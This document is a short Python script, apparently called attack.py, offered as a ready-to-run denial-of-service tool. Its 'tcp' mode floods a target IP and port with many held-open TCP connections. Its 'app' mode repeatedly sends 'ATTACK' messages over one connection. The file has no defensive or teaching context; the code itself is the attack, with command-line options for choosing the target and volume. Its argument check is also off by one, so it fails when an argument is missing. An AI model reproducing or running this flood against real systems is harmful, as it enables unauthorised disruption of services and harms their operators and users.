import socket
import threading
import time
import sys

def tcp_flood(target_ip, target_port, num_connections):
    print("[⚡] Starting TCP flood attack...")
    sockets = []
    try:
        for _ in range(num_connections):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((target_ip, target_port))
                sockets.append(s)
                print(f"[+] Connection {len(sockets)} established", end='\r')
            except:
                print(f"[!] Failed to connect")
        print(f"\n[⚡] {len(sockets)} connections active. Press Enter to stop.")
        input()
    finally:
        for s in sockets:
            s.close()

def app_attack(target_ip, target_port, num_requests):
    print("[💥] Starting application-layer attack...")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))
        for i in range(num_requests):
            try:
                s.send(b"ATTACK")
                response = s.recv(1024)
                print(f"[→] Sent request {i+1}: {response.decode()}", end='\r')
                time.sleep(0.1)
            except:
                break
    finally:
        s.close()

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("Usage: attack.py [tcp/app] [IP] [PORT] [CONNECTIONS/REQUESTS]")
        sys.exit(1)

    mode = sys.argv[1]
    ip = sys.argv[2]
    port = int(sys.argv[3])
    count = int(sys.argv[4])

    if mode == "tcp":
        tcp_flood(ip, port, count)
    elif mode == "app":
        app_attack(ip, port, count)
